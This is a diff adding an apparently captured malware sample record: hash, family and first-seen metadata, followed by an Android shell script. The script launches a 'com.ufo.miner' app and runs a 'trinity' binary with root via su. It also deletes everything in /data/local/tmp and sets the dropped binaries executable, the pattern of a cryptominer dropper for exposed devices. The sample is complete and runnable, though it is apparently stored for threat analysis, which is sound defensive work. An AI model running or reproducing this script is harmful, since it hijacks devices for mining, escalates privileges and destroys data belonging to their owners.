@@ -1,0 +1,21 @@
+# sha256: e57544a8c64ed484c5001103e6a5530626fa78fb7ec17ed304172a9830bbb598
+# family: script_generic
+# kind: script
+# size_bytes: 407
+# first_seen: 2026-07-15 01:25:12.313913 UTC
+# times_seen: 1
+# yara_matches: none
+# ------------------------------------------------------------
+
+pm path com.ufo.miner
+am start -n com.ufo.miner/com.example.test.MainActivity
+ps | grep trinity
+rm -rf /data/local/tmp/*
+pm path com.ufo.miner
+am start -n com.ufo.miner/com.example.test.MainActivity
+ps | grep trinity
+rm -rf /data/local/tmp/*
+chmod 0755 /data/local/tmp/nohup
+chmod 0755 /data/local/tmp/trinity
+/data/local/tmp/nohup su -c /data/local/tmp/trinity
+/data/local/tmp/nohup /data/local/tmp/trinity
